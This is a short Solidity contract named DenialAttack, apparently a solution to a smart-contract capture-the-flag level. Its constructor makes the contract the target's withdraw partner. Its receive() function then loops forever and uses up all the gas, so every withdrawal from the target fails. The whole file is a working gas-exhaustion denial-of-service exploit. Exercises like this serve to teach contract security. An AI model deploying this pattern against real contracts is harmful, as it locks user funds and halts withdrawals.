// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialAttack {
    IDenial public denialContract;

    constructor(address _denialContractAddress) {
        denialContract = IDenial(_denialContractAddress);
        denialContract.setWithdrawPartner(address(this));
    }

    // This function will consume all available gas
    receive() external payable {
        while (true) {}
    }
}
